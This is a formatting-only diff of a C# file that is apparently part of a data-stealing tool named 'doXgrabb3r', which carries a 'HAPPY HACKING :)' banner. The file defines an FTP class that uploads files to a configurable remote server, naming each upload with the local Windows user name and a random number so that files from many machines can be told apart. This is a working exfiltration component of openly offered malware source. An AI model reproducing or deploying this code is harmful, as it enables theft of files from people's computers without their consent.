@@ -1,4 +1,5 @@
-﻿using System;
+﻿
+using System;
 using System.IO;
 using System.Net;
 
@@ -47,55 +48,51 @@ using System.Net;
 /*           HAPPY HACKING :)            */
 
 
-namespace doXgrabb3r
-{
-    class FTP
-    {
-        private string ftpusername;
-        private string ftppassword;
-        private string ftpurl;
-        private string usernamePC = "_";
+namespace doXgrabb3r {
+ class FTP {
+  private string ftpusername;
+  private string ftppassword;
+  private string ftpurl;
+  private string usernamePC = "_";
 
-        public FTP(string host, string user, string pass, int rand)
-        {
-            usernamePC = Environment.UserName+"_"+rand+"_";
-            ftpurl = host;
-            ftpusername = user;
-            ftppassword = pass;
-        }
+  public FTP(string host, string user, string pass, int rand) {
+   usernamePC = Environment.UserName + "_" + rand + "_";
+   ftpurl = host;
+   ftpusername = user;
+   ftppassword = pass;
+  }
 
-        public string ftp_upload(string filePath) {
-            string filename = Path.GetFileName(filePath);
+  public string ftp_upload(string filePath) {
+   string filename = Path.GetFileName(filePath);
 
-            FtpWebRequest ftpClient = (FtpWebRequest)FtpWebRequest.Create(ftpurl + usernamePC + filename);
-            ftpClient.Credentials = new NetworkCredential(ftpusername, ftppassword);
-            ftpClient.Method = WebRequestMethods.Ftp.UploadFile;
-            ftpClient.UseBinary = true;
-            ftpClient.KeepAlive = true;
-            FileInfo fi = new FileInfo(filePath);
-            ftpClient.ContentLength = fi.Length;
-            byte[] buffer = new byte[4097];
-            int bytes = 0;
-            int total_bytes = (int)fi.Length;
-            FileStream fs = fi.OpenRead();
-            Stream rs = ftpClient.GetRequestStream();
-            while (total_bytes > 0)
-            {
-                bytes = fs.Read(buffer, 0, buffer.Length);
-                rs.Write(buffer, 0, bytes);
-                total_bytes = total_bytes - bytes;
-            }
-            //fs.Flush();
-            fs.Close();
-            rs.Close();
-            FtpWebResponse uploadResponse = (FtpWebResponse)ftpClient.GetResponse();
-            string value = uploadResponse.StatusDescription;
-            uploadResponse.Close();
+   FtpWebRequest ftpClient = (FtpWebRequest) FtpWebRequest.Create(ftpurl + usernamePC + filename);
+   ftpClient.Credentials = new NetworkCredential(ftpusername, ftppassword);
+   ftpClient.Method = WebRequestMethods.Ftp.UploadFile;
+   ftpClient.UseBinary = true;
+   ftpClient.KeepAlive = true;
+   FileInfo fi = new FileInfo(filePath);
+   ftpClient.ContentLength = fi.Length;
+   byte[] buffer = new byte[4097];
+   int bytes = 0;
+   int total_bytes = (int) fi.Length;
+   FileStream fs = fi.OpenRead();
+   Stream rs = ftpClient.GetRequestStream();
+   while (total_bytes > 0) {
+    bytes = fs.Read(buffer, 0, buffer.Length);
+    rs.Write(buffer, 0, bytes);
+    total_bytes = total_bytes - bytes;
+   }
+   //fs.Flush();
+   fs.Close();
+   rs.Close();
+   FtpWebResponse uploadResponse = (FtpWebResponse) ftpClient.GetResponse();
+   string value = uploadResponse.StatusDescription;
+   uploadResponse.Close();
 
-            return value;
-        }
+   return value;
+  }
 
 
 
-    }
+ }
 }
